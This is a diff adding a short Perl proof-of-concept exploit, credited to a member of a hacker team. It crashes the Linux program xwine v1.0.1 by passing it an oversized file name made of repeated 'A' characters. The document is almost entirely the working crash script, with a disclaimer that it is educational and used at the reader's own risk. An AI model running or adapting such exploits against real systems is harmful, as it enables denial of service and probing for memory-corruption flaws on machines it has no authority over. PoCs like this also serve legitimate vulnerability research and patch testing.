@@ -1,0 +1,29 @@
+# xwine v1.0.1 (.exe file) Local Crash PoC Exploit
+# Install: sudo apt-get install xwine
+#
+# Author: JosS <Jose Luis Gongora Fernandez>
+# mail: sys-project[at]hotmail[dot]com
+# site: http://hack0wn.com/
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+
+
+<<crash.pl>>
+
+#!/usr/local/bin/perl
+
+chomp(my $version = `xwine --version`);
+if ($version =~ m/v1.0.1/)
+{
+print "Starting PoC...\n";
+# payload = "xwine" . "A" x 4096 . ".exe";
+chomp(my $buffer = `xwine AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.exe`);
+# print "$buffer\n\n";
+}
+else
+{
+print "\n[-] Xwine is not installed on the system\n\n";
+exit(1);
+}
